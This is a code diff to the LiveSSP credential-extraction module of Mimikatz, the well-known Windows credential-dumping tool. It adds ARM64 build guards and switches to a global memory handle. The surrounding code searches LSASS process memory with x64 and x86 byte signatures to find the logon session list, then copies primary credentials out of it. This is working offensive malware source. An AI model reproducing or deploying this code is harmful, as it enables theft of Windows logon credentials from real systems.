@@ -4,12 +4,13 @@
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_livessp.h"
-#ifdef _M_X64
+#if !defined(_M_ARM64)
+#if defined(_M_X64)
 BYTE PTRN_WALL_LiveLocateLogonSession[]	= {0x74, 0x25, 0x8b};
 KULL_M_PATCH_GENERIC LiveReferences[] = {
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LiveLocateLogonSession),	PTRN_WALL_LiveLocateLogonSession},	{0, NULL}, {-7}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WALL_LiveLocateLogonSession[]	= {0x8b, 0x16, 0x39, 0x51, 0x24, 0x75, 0x08};
 KULL_M_PATCH_GENERIC LiveReferences[] = {
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LiveLocateLogonSession),	PTRN_WALL_LiveLocateLogonSession},	{0, NULL}, {-8}},
@@ -30,8 +31,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURIT
 {
 	KIWI_LIVESSP_LIST_ENTRY credentials;
 	KIWI_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
+	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	
 	if(kuhl_m_sekurlsa_livessp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_livessp_package.Module, LiveReferences, ARRAYSIZE(LiveReferences), (PVOID *) &LiveGlobalLogonSessionList, NULL, NULL, NULL))
 	{
@@ -50,3 +50,4 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURIT
 		}
 	} else kprintf(L"KO");
 }
+#endif
